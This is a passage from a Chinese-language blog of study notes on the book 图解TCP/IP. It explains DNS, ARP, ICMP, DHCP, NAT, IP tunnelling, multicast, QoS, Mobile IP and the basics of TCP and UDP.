src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418212635557.png" alt="扩展首部-1"></p><p>具体的扩展首部如下，当需要对IPv6的数据报进行分片时，可以设置为扩展域为44，使用IPsec时，可以使用50,51的ESP、AH</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230418212805812.png" alt="扩展首部-2"></p><h2 id="第5章-IP协议相关技术"><a href="#第5章-IP协议相关技术" class="headerlink" title="第5章 IP协议相关技术"></a>第5章 IP协议相关技术</h2><p>IP旨在让最终目标主机收到数据包，但是在这一过程中仅仅有IP是无法实现通信的，必须还要能够解析主机名称和MAC地址的功能，以及数据包在发送过程中异常情况处理的功能。此外还会涉及IP必不可少的其他功能。</p><h3 id="5-1-DNS"><a href="#5-1-DNS" class="headerlink" title="5.1 DNS"></a>5.1 DNS</h3><p>IP地址是由一串数据序列组成，不好记，所以引入一个叫做主机标识码的东西。这种识别方式是指为每台计算机赋以唯一的主机名，在进行网络通信的时候可以直接使用主机名称而无需输入一大串的IP地址，此时，系统自动将主机名转换为具体的IP地址。</p><p>DNS系统就是用于管理主机名和IP地址之间对应关系的系统，换句话说就是可以维护一个用来表示组织内部主机名和IP地址之间的对应关系的数据库。</p><p><strong>域名服务器</strong>是指管理域名的主机和相应的软件，可以管理所在分层的域的相关信息。</p><p>域名和域名服务器需要按照分层进行设置，如果域名服务器宕机，那么针对该域的DNS服务器查询也就无法正常工作。因此为了提高容灾能力，一般会设置至少两个以上的域名服务器，一旦第一个域名服务器无法提供查询的时候，就会自动转到第二个甚至第三个域名服务器上进行，以此可以按照顺序进行灾备处理。</p><p><strong>解析器：</strong>进行DNS查询的主机和软件叫做DNS解析器。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230419203908483.png" alt="DNS查询"></p><p>解析器为了调查IP地址，向域名服务器进行查询处理。接收这个查询请求的域名服务器首先会在自己的数据库进行查找。如果有该域名所对应的IP地址就返回。如果没有，则根开始对这棵树按照顺序进行遍历，直到找到指定的域名服务器。解析器和域名服务器将最新了解到的信息暂时保存在缓存里，这样可以减少每次查询时的性能消耗。</p><h3 id="5-2-ARP"><a href="#5-2-ARP" class="headerlink" title="5.2 ARP"></a>5.2 ARP</h3><p>在数据链路层，进行实际通信需要了解每个IP地址所对应的MAC地址</p><p><strong>ARP</strong>是一种解决地址问题的协议。以目标IP地址为线索，用来定位下一个应该接收数据分包的网络设备对应的MAC地址。如果目标主机不在同一个链路上时，可以通过ARP查找下一跳路由器的MAC地址，不过ARP只适用于IPv4，不能用于IPv6。</p><p>假定主机A向同一链路上的主机B发送IP包，主机A的IP地址为172.20.1.1，主机B的IP地址为172.20.1.2，它们互不知道对方的MAC地址。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230419204758212.png" alt="主机A给主机B发送IP包"></p><p>主机A为了获得主机B的MAC地址，初始要通过广播发送一个ARP请求包，这个包中包含了想要了解其MAC地址的主机IP地址。如果ARP的请求包中的目标IP地址与自己的IP地址一致，那么这个节点就将自己的MAC地址塞入ARP响应包返回给主机A。</p><p>但是每发送一个IP数据报都要进行一次ARP请求以此确定MAC地址，那将会造成不必要的网络流量，因此，通常的做法是把获取到的MAC地址缓存一段时间。即把第一次通过ARP获取到的MAC地址作为IP对MAC的映射关系记忆到一个ARP缓存表中，下一次再向这个IP数据发送数据报时不需再重新发送ARP请求，而是直接使用这个缓存表当中的MAC地址进行数据报的发送。每执行一次ARP就可以获取想要的MAC地址。这样，在一定程度上防止了ARP包在网络上被大量广播的可能性。</p><p>MAC地址的缓存是有一定的期限的，超过这个期限，缓存的内容将被清除。这使得MAC地址与IP地址对应关系即使发生了变化，也依然能够将数据包正确地发送给目标地址。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230419205513112.png" alt="ARP"></p><p><strong>有了IP地址，为什么还需要MAC地址？</strong></p><p>考虑发送给其他数据链路中某一个主机时的情况</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230419205850158.png" alt="IP？MAC?"></p><p>主机A要给主机B发送数据，已知主机B的MAC地址，这样是无法将数据包发送过去的，因此路由器C会隔断两个网络，无法实现直接从主机A发送数据报给主机B。主机A必须要先将数据报发送给路由器C的MAC地址C1。而且，假定MAC地址用广播地址，那么路由器D也将会收到该广播消息，于是路由器D又将该消息发送给路由器C，导致数据包被重复发送两次。</p><p>所以IP地址和MAC地址缺一不可，同时也就有了将他们关联起来的ARP协议。</p><p><strong>RARP</strong>：顾明思意，将ARP反过来，从MAC地址定位IP地址的一种协议。</p><p>对于个人主机来说，可以自己设置IP地址，也可以通过DHCP自动分配获取IP地址，然后对于嵌入式设备来说，会遇到没有任何输入接口或无法通过DHCP动态获取IP地址的情况。</p><p>这时候需要RARP，架设一台RARP服务器，从而再这个服务器上注册设备的MAC地址及其IP地址，然后将这个设备接入到网络，插电启动设备时，该设备发送一条“我的MAC地址是<em>*</em>，请告诉我，我的IP地址应该是什么“的请求信息。RARP服务器接到这个消息后返回类似于”MAC地址为XXX的设备，IP地址为XXX“的信息给这个设备，而设备就根据从RARP服务器收到的应答消息设置自己的IP地址。</p><p><strong>代理ARP：</strong>通常ARP包会被路由器隔离，但是采用代理ARP的路由器可以将ARP请求转发给邻近的网段。由此，两个以上网段的节点之间可以像在同一个网段中一样进行通信。</p><h3 id="5-3-ICMP"><a href="#5-3-ICMP" class="headerlink" title="5.3 ICMP"></a>5.3 ICMP</h3><p>为了确保网络能够按照预期正常工作，一旦遇到什么问题需要立即制止问题的蔓延，为了减轻网络管理员的负担，ICMP应运而生。</p><p><strong>ICMP的主要功能：</strong>确认IP包时候成功送达目标地址，通知在发送过程当中IP包被废弃的具体原因，改善网络设置等。有了这些功能，就可以获得网络是否正常、设置是否有误以及设备有何异常等信息，从而便于进行网络上的问题诊断。</p><p><strong>ICMP的消息大致分为两类：</strong>一类是通知出错原因的错误消息，另一类是用于诊断的查询消息。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230419212039091.png" alt="ICMP消息类型"></p><p><strong>主要的ICMP消息</strong></p><p><strong>ICMP目标不可达消息</strong>：IP路由器无法将IP数据包发送给目标地址时，会给发送端主机返回一个目标不可达的ICMP消息，并在这个消息中显示不可达的具体原因。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230419212340609.png" alt="ICMP目标消息不可达类型"></p><p>在实际中，经常会遇到错误代码是1，表示主机不可达，它是指路由表中没有该主机的信息，或者该主机没有连接到网络的意思。</p><p><strong>ICMP重定向消息</strong>：如果路由器发现发送端主机使用了次优的路径发送数据，那么它会返回一个ICMP重定向的消息给这个主机。在这个消息中包含了最合适的路由信息和源数据。这主要发生在路由器持有更好的路由信息的情况下，路由器会通过这样的ICMP消息给发送端主机一个更合适的发送路由。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230419213008806.png" alt="ICMP重定向消息"></p><p><strong>ICMP超时消息</strong>：IP包中的TTL字段减为0时该IP包被丢弃，此时IP路由器将会发送一个ICMP超时的消息给发送端主机，并通知该包已被丢弃。设置IP包生存周期的主要目的，是为了在路由控制遇到问题发生循环状况时，避免IP包无休止地在网络上被转发。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230419213215370.png" alt="ICMP超时消息"></p><p><strong>ICMP回送消息：</strong>用于进行通信的主机或路由器之间，判断所发送的数据包是否成功到达对端的一种消息。</p><p><strong>ICMP原点抑制消息：</strong>在低速广域线路的情况下，连接WAN的路由器可能会遇到网络拥堵的问题，ICMP原点抑制消息就是为了缓和这种情况，当路由器向低速线路发送数据时，其发送队列的残存变为零而无法发送出去时，可以向IP包的源地址发送一个ICMP原点抑制消息。收到这个消息的主机借此了解在整个线路的某一处发生了拥堵，从而打开IP包的传输间隔，然而由于这种ICMP可能会引入不公平的网络通信，一般不被使用。</p><p><strong>ICMP路由器探索消息</strong>：主要用于发现与自己相连的网络中的路由器。</p><p><strong>ICMP地址掩码消息：</strong>主要用于主机或路由器想要了解子网掩码的情况。可以向那些目标主机或路由器发送ICMP地址掩码请求消息，然后通过接收ICMP地址掩码应答消息获取子网掩码的信息。</p><p><strong>ICMPv6</strong></p><p>IPv4中ICMP仅作为一个辅助作用支持IPv4。也就是说，在IPv4时期，即使没有ICMP，仍然可以实现IP通信。然而在IPv6中，ICMP的作用被扩大，如果没有ICMPv6，IPv6就无法正常通信。</p><p>尤其在IPv6中，从IP地址定位MAC地址的协议从ARP转为ICMP的邻居探索消息，这种邻居探索消息融合了IPv4的ARP、ICMP重定向以及ICMP路由器选择消息等功能于一体，甚至还提供自动设置IP地址的功能</p><p><strong>ICMPv6中将ICMP大致分为两类：一类是错误消息，另一类是信息消息，类型0-127属于错误消息，128-255属于信息消息</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230420142727505.png" alt="消息类型"></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230420142739083.png" alt="消息类型(续)"></p><p><strong>邻居探索：</strong>ICMPv6中从类型133至137的消息叫做邻居探索消息。这种邻居探索消息对于IPv6通信起着举足轻重的作用。邻居请求消息用于查询IPv6的地址与MAC地址的对应关系，并由邻居宣告消息得知MAC地址。</p><p>此外，实现了即插即用的功能，在没有DHCP服务器的环境下也能实现IP地址的自动获取。如果是一个没有路由器的网络，就使用MAC地址作为链路本地单播地址。而在一个有路由器的网络环境中，可以从路由器获得IPv6地址的前面部分，后面部分则由MAC地址进行设置。此时可以利用路由器请求消息和路由器宣告消息进行设置。</p><h3 id="5-4-DHCP"><a href="#5-4-DHCP" class="headerlink" title="5.4 DHCP"></a>5.4 DHCP</h3><p><strong>1. DHCP实现即插即用</strong></p><p>如果逐一为每一台主机设置IP地址会非常繁琐。特别是笔记本电脑、智能终端以及平板电脑等设备时，每移动到一个新的地方，都要重新设置IP地址。</p><p>所以为了实现自动设置IP地址、统一管理IP地址分配，就产生了DHCP协议。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230420203355719.png" alt="DHCP"></p><p><strong>2. DHCP的工作机制</strong></p><p>需要架设一台DHCP服务器，然后将DHCP所要分配的IP地址设置到服务器上。此外，还需要将相应的子网掩码、路由控制信息以及DNS服务器的地址等设置到服务器上。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230420231922035.png" alt="DHCP的工作机制"></p><p>在使用DHCP的时候，如果DHCP服务器遇到故障，将导致无法自动分配IP地址，从而也导致网段内所有主机之间无法进行TCP/IP通信。为了避免此类问题，通常需要两台及以上的DHCP服务器。</p><p>但是这样可能会导致几处分配的IP地址相互冲突，所以必须要检查：</p><p><strong>DHCP服务端：</strong>在分配IP地址前发送ICMP回送请求包，确认没有返回应答。</p><p><strong>DHCP客户端：</strong>针对从DHCP那里获得的IP地址发送ARP请求包，确认没有返回应答。</p><p><strong>3. DHCP中继代理：</strong>家庭网络大多都只有一个以太网的网段，与其连接的主机台数也不会太多。因此，只要有一台DHCP服务器就足以应对IP地址分配的需求，而大多数情况下都由宽带路由器充当这个DHCP角色。</p><p>如果一个网段中设置DHCP服务器将会是个庞大的工程，即使路由器可以分担DHCP的功能，如果网络中有不下100个路由器，就要为100个路由器设置它们各自可分配IP地址的范围，并对这些范围进行后续的变更维护，这将是一个极其耗时和难于管理的工作。</p><p>所以需要一个<strong>DHCP中继代理</strong>来做这个事情。它可以设置DHCP服务器的IP地址，从而可以在DHCP服务器上为每一个网段注册IP地址的分配范围。</p><p>DHCP客户端会向DHCP中继代理发送DHCP请求包，而DHCP中继代理在收到这个广播包以后再以单播的形式发给DHCP服务器。服务器端收到该包以后再向DHCP中继代理返回应答，并由DHCP中继代理将此包转发给DHCP客户端。由此，DHCP服务器即使不在统一个链路上也可以实现统一分配和管理IP地址。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230420234915343.png" alt="DHCP中继代理"></p><h3 id="5-5-NAT"><a href="#5-5-NAT" class="headerlink" title="5.5 NAT"></a>5.5 NAT</h3><p><strong>1. NAT定义</strong></p><p>NAT技术是用于在本地网络中使用私有地址，在连接互联网时转而使用全局IP地址的技术。除转换IP地址外，还出现了可以转换TCP、UDP端口号的NAPT技术，由此可以实现用一个全局IP地址与多个主机的通信。</p><p>NAT是为正在面临地址枯竭的IPv4而开发的技术。</p><p><strong>2. NAT的工作机制</strong></p><p>局域网内设置为私有IP地址，在于外部通信时被替换成全局IP地址</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230420235541551.png" alt="NAT的工作机制"></p><p>在NAT路由器的内部，有一张自动生成的用来转换地址的表。</p><p>当私有网络内的多台机器同时都要与外部进行通信的时候，仅仅转换IP地址，可能会出现全局IP地址不够用的问题。所以出现了包含端口号一起转换的方式（NAPT）来解决这个问题。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421002004708.png" alt="NAPT"></p><p>也是实际上两个客户端A和B，但是NAPT进行这个转换，转换后IP地址是一致的，但是端口不一致。</p><p>这个转换表在NAT路由器上自动生成，在建立TCP连接首次握手时的SYN包一经发出，就会生成这个表，而后又随着收到关闭连接时发出FIN包的确认应答从表中被删除。</p><p><strong>3. NAT-PT</strong></p><p>为了让服务在IPv6上也能正常使用，产生了NAT-PT（NAPT-PT)规范。NAT-PT是将IPv6的首部转换为IPv4的首部的一种技术，有了这种技术，那些只有IPv6地址的主机也就是能够与IPv4地址的其他主机进行通信了。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421002447565.png" alt="NAT-PT"></p><p><strong>4. NAT的潜在问题</strong></p><p>由于NAT都依赖于自己的转换表，因此会有如下几点限制：</p><p>（1）无法从NAT的外部向内部服务器建立连接</p><p>（2）转换表的生成与转换操作都会产生一定的开销</p><p>（3）通信过程中一旦NAT遇到异常需要重新启动时，所有的TCP连接都将被重置</p><p>（4）即使备置两台NAT做容灾备份，TCP连接还是会断开</p><p><strong>5. 解决NAT的潜在问题与NAT穿越</strong></p><p><strong>改用IPv6</strong>：如果使用IPv6地址，可用的IP地址范围有了极大的扩展，所有的主机都可以配置一个全局的IP地址</p><p><strong>依据应用，用户忽略NAT的存在而进行通信</strong>：在NAT内侧（私有IP地址的一边）主机上运行的应用为了生成NAT转换表，需要先发送一个虚拟的网络包给NAT的外侧。而NAT并不知道这个虚拟的包是什么，还是会照样读取包首部中的内容并自动生成一个转换表。这时如果转换表构造合理，那么还能实现NAT外侧的主机与内侧的主机连接进行通信。此外，应用还可以与NAT路由器进行通信生成NAT表，并通过一定的方法将NAT路由器上附属的全局IP地址传给应用。</p><p>如此，NAT外侧和内侧可以进行通信，这种现象叫做“NAT穿越”</p><h3 id="5-6-IP隧道"><a href="#5-6-IP隧道" class="headerlink" title="5.6 IP隧道"></a>5.6 IP隧道</h3><p>如果有两个网络A,B使用的是IPv6，如果处于中间位置的网络C支持使用IPv4的话，网络A和网络B之间无法直接进行通信，为了正常通信，就必须采用IP隧道的功能。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421083259517.png" alt="IP隧道"></p><p>IP隧道中可以将那些从网络A发过来的IPv6的包统和为一个数据，再为之追加一个IPv4的首部以后转发给网络C。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421083433191.png" alt="首部添加"></p><h3 id="5-7-其他IP相关技术"><a href="#5-7-其他IP相关技术" class="headerlink" title="5.7 其他IP相关技术"></a>5.7 其他IP相关技术</h3><p><strong>1. IP多播相关技术</strong></p><p>在多播通信中，确认接收端是否存在非常重要，如果没有接收端，发送多播消息将会造成网络流量的浪费。而确认是否有接收端，通过MLD（Multicast Listener Discovery）实现，它是IPv4中IGMP和IPv6中IGMPv6的重要功能之一。</p><p><strong>IGMP主要两大作用：</strong></p><p>（1）向路由器表明想要接收多播消息</p><p>（2）向交换集线器通知想要接收多播的地址</p><p>首先，路由器根据第1个作用，了解到想要接收多播的主机，并将这个信息告知给其他的路由器，准备接收多播消息。而多播消息的发送路径则由PIM-SM、PIM-DM、DVMRP、DOOSPF等多播路由协议决定</p><p>其次，第2个作用也被称为IGMP（MLD）侦听。通常交换集线器只会习得单播地址。而多播帧则跟广播帧一样不经过滤就会全部被拷贝到端口上。这回导致网络负荷加重，甚至给那些通过多播实现高质量图像传播的广播电视带来严重影响。为了解决这个问题，采用作为第二个作用的IGMP探听。支持IGMP探听的交换集线器可以过滤多播帧，从而也能降低网络的负荷。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421085335430.png" alt="IGMP(MLD)的多播实现"></p><p><strong>2. IP任播</strong></p><p>IP任播主要用于报警电话110与消防电话119系统。</p><p>IP任播是指为那些提供同一种服务的服务器配置同一个IP地址，并与最近的服务器进行通信的一种方法，可适用于IPv4和IPv6</p><p>DNS根域名服务器就用到了IP任播。IP 任播通常用于将 DNS 服务器配置为同一 IP 地址，从而使得客户端请求时可以被路由到最近的 DNS 服务器。这样可以提高 DNS 的响应速度，并减轻 DNS 服务的负担。当一个客户端需要访问某个域名时，它将请求发送到 DNS 服务器的 IP 地址。这个请求将被路由到最近的 DNS 服务器，该服务器会向上级 DNS 服务器请求 DNS 解析，并将解析结果返回给客户端。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421085801793.png" alt="DNS中的IP任播"></p><p><strong>3. 通信质量控制</strong></p><p><strong>控制通信质量</strong>的工作机制是对于需要保证通信质量的包，路由器会进行特殊处理，并且在力所能及的范围之内对其进行优先处理。</p><p>通信质量包括带宽，延迟，时延波动等内容。路由器在内部的队列中可以优先处理这些要求保证通信质量的包，有时甚至不得不丢弃那些没有优先级的包以保证通信质量。</p><p>为了控制通信质量，人们提出了RSVP技术，它包括两个内容，一是提供点对点的详细优先控制，另一个是提供相对较粗粒度的优先控制。</p><p><strong>IntServ</strong></p><p>IntServ是针对特定应用之间的通信进行质量控制的一种机制。这里的特定的应用是指源IP地址、目标IP地址、源端口、目标端口以及协议号五项完全内容一致。它是针对应用的连接进行详细的通信质量控制。</p><p><strong>DiffServ</strong></p><p>针对特定的网络进行较粗粒度的通信质量控制。例如：针对某个特定的供应商进行顾客排名，从而进行数据包的优先处理。</p><p>进入DiffServ质量控制的网络叫做DiffServ域。在DiffServ域中的路由器会对所有进入该域IP包首部中的DSCP字段进行替换。对于期望被优先处理的包设置一个有限制， 对于没有这种期望的包设置无需优先的值。DiffServ域内部的路由器则根据IP首部的DSCP字段的值有选择性的进行优先处理。在发生网络拥堵时还可以丢弃优先级较低的包。</p><p>IntServ中每进行一次通信都要设置一次流量设置。路由器也必须得针对不同流量进行质量控制，因此机制太过复杂，影响了实用性。而DiffServ则根据供应商的合约要求以及较粗粒度进行质量控制，机制相对简单，实用性较好。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421091228531.png" alt="DiffServ"></p><p><strong>4. 显式拥塞通知</strong></p><p>尽管TCP也能控制网络拥塞，不过它是通过数据包的实际损坏情况来判断是否发生拥塞。然而这种方法并不能在数据包损坏之前减少数据包的发送量。为了解决这个问题，在IP层新增阿了一种使用显示拥塞通知的机制，即ECN。</p><p>ECN为实现拥塞通知的功能，将IP首部的TOS字段替换为ENC字段，并在TCP首部的保留位中追加CWR标志和ECE标志</p><p>ECN的机制就是在发送包的IP首部中记录路由器是否遇到拥塞，并在返回包的TCP首部中通知是否发生过拥塞。拥塞检查在网络层进行，而拥塞通知则在传输层进行，这两层的互相协助实现了拥塞通知的功能。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421092107136.png" alt="ECN机制"></p><p><strong>Mobile IP</strong></p><p>对于移动设备来说，进行通信，一旦所连接的子网发生变化，则无法通过TCP继续通信，因为TCP是面向连接的协议，自始至终都需要发送端和接收端主机的IP地址不发生变化。在UDP的情况下，也无法继续通信，不过鉴于UDP是面向非连接的协议，或许可以在应用层面上处理变更IP地址的问题，但是改造所有的应该让其适应IP地址变更不是容易的事情，所以Mobile IP出现了</p><p>这种技术在主机所连接的IP发生变化时，主机IP地址仍保持不变，应用不需做任何改变，即使是在IP地址发生变化的环境，通信也可以继续。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421093054816.png" alt="Mobile IP"></p><p>移动主机：是指那些移动了位置，IP地址却不变的设备，在没移动的时候，所连接的网络叫做归属网络，IP地址叫做归属地址。归属地址如同一个人的户籍，移动也不会改变地址。</p><p>归属代理：在归属网络下，可监控移动设备的位置，并转发数据包给移动主机。</p><p>外部代理：使用于支持移动主机的移动设备，所有需要接入网络的移动主机都需要它。</p><p><strong>Mobile IPv6</strong></p><p>（1）没有外部代理的网络不能通信</p><p>（2）IP包呈三角形路径被转发而因此效率不高</p><p>（3）为提高安全，一个域可以做这样的设置，即如果从自己的域向外部发送包的源地址不是本域在用的IP地址，则丢弃该包。而且这种设置可以越来越多。是因为从移动主机发给通信对端的IP包的源地址是归属地址，与另一个域的IP地址不符，因此目的地路由器可能会丢弃这个包。</p><p>以上问题在Mobile IPv6中已经得到了相应的解决。</p><p>（1）外部代理的功能由市县Mobile IPv6的移动主机自己承担</p><p>（2）考虑路径最优化，可以不用经过归属代理进行直接通信</p><p>（3）IPv6首部的源地址中赋与移动地址，不让防火墙丢弃</p><h2 id="第6章-TCP与UDP"><a href="#第6章-TCP与UDP" class="headerlink" title="第6章 TCP与UDP"></a>第6章 TCP与UDP</h2><h3 id="6-1-传输层的作用"><a href="#6-1-传输层的作用" class="headerlink" title="6.1 传输层的作用"></a>6.1 传输层的作用</h3><p>传输层的TCP和UDP，为了识别自己所传输的数据部分究竟应该发给哪个应用，也设定了这样一个编号（端口号）。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421095316603.png" alt="http请求"></p><p>TCP/IP的众多应用协议大多以客户端/服务端的形式运行。客户端类似于客户的意思，是请求的发起端，而服务端则表示提供服务的意思，是请求的处理端。另外，作为服务端的程序有必要提前启动，准备接收客户端的请求，否则即使有客户端的请求发过来，也无法做到相应的处理。</p><p>这些服务端程序在UNIX系统中叫做守护进程，例如Http的服务端程序是httpd，而ssh的服务端程序是sshd。</p><p>确定一个请求究竟是发给的哪个服务端，可以通过所收到数据包的目标端口号识别。</p><p><strong>1. 两种传输层协议TCP和UDP</strong></p><p><strong>TCP：</strong>面向连接的、可靠的流协议。流就是指不间断的数据结构。</p><p>TCP为提供可靠性传输，实行顺序控制或重发控制机制。此外还具备流控制、拥塞控制、提高网络利用率等众多功能。</p><p><strong>UDP：</strong>不具有可靠性的数据报协议。细微的处理它会交给上层的应用去完成。在UDP的情况下，虽然可以确保发送消息的大小，却不能保证消息一定会到达。因此，应用有时会根据自己的需要进行重发处理。</p><p><strong>2. TCP与UDP区分</strong></p><p>TCP用于传输层有必要实现可靠传输的情况。由于它是面向连接并具备顺序控制、重发控制等机制的，所以它可以为应用提供可靠传输。</p><p>而在另一方面，UDP主要用于那些对高速传输和实时性有较高要求的通信或广播通信。以IP电话进行通话为例，如果使用TCP，数据在传送途中如果丢失会被重发，但是这样无法流畅的传输通话人的声音会导致无法进行正常交流。而采用UDP，他不会进行重发处理，从而也就不会有声音大幅度延迟到达的问题，即使有部分数据丢失，也只是会影响某一小部分的通话。此外，在多播与广播通信中也使用UDP而不是TCP。</p><h3 id="6-2-端口号"><a href="#6-2-端口号" class="headerlink" title="6.2 端口号"></a>6.2 端口号</h3><p><strong>1. 端口号定义</strong></p><p>数据链路和IP中的地址，分别指的是MAC地址和IP地址。前者用来识别同一链路中不同的计算机，后者用来识别TCP/IP网络中互连的主机和路由器。在传输层中也有这种概念，就是端口号。端口号用来识别同一台计算机中进行通信的不同应用程序。</p><p><strong>2. 根据端口号识别应用</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421101546644.png" alt="端口号识别应用"></p><p><strong>3. 通过IP地址、端口号、协议号进行通信识别</strong></p><p>在TCP/IP或UDP/IP通信中通常采用5个信息来识别一个通信。它们是“源IP地址”、“目标IP地址”、”协议号“、”源端口号“、”目标端口号“</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421101838086.png" alt></p><p><strong>4. 端口号的确定</strong></p><p><strong>（1）标准既定的端口号</strong>，静态方法，为每个应用程序都指定一个固定的端口号。如HTTP就是80、SMTP就是25，这些知名端口一般由0-1023的数字分配而成。</p><p><strong>（2）时序分配法</strong>，动态方法，由操作系统进行分配，操作系统可以为每个应用分配互不冲突的端口号，例如，每需要一个新的端口号时，就在之前分配号码的基础上加1，这样操作系统就可以动态地管理端口号。根据这种动态分配端口号的机制，即使是同一个客户端程序发起的多个TCP连接，识别这些通信连接的5部分数字也不会全部相同。</p><p>动态分配的端口号取值范围在49152到65535之间</p><h3 id="6-3-UDP"><a href="#6-3-UDP" class="headerlink" title="6.3 UDP"></a>6.3 UDP</h3><p>UDP不提供复杂的控制机制，利用IP提供面向无连接的通信服务，并且它是将应用程序发来的数据在收到的那一刻，立即按照原样发送到网络上的一种机制。</p><p>UDP面向无连接，它可以随时发送数据，再加上UDP本身的处理既简单又高效，因此经常用以以下几个方面</p><p>（1）包总量较少的通信（DNS、SNMP等）</p><p>（2）视频、音频等多媒体通信（即时通信）</p><p>（3）限定于LAN等特定网络中的应用通信</p><p>（4）广播通信（广播、多播）</p><h3 id="6-4-TCP"><a href="#6-4-TCP" class="headerlink" title="6.4 TCP"></a>6.4 TCP</h3><p>它充分地实现了数据传输时各种控制功能，可以进行丢包时的重发控制，还可以对次序乱掉的分包进行顺序控制。而这些在UDP中都没有，此外,TCP作为一种面向有连接的协议，只有在确定通信对端存在时才会发送数据，从而可以控制通信流量的浪费。</p><p><strong>1. 通过序列号与确认应答提高可靠性</strong></p><p>在TCP中，当发送端的数据到达接收主机时，接收端主机会返回一个已收到的消息的通知，这个消息叫做确认应答（ACK)。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421104732646.png" alt="ACK"></p><p>TCP通过肯定的确认应答（ACK）实现可靠的数据传输，当发送端数据发出之后会等待对端的确认应答。如果有确认应答，说明数据已经成功到达对端。反之，则数据丢失的可能性很大。</p><p>在一定时间内没有等到确认应答，发送端就可以认为数据已经丢失，并进行重发。由此，即使产生了丢包，仍然能保证数据能够到达对端，实现可靠传输。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421104955365.png" alt="数据包丢失"></p><p>未收到确认应答并不意味着数据一定丢失，也有可能是数据对方已经收到，只是返回的确认应答在途中丢失。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230421105131343.png" 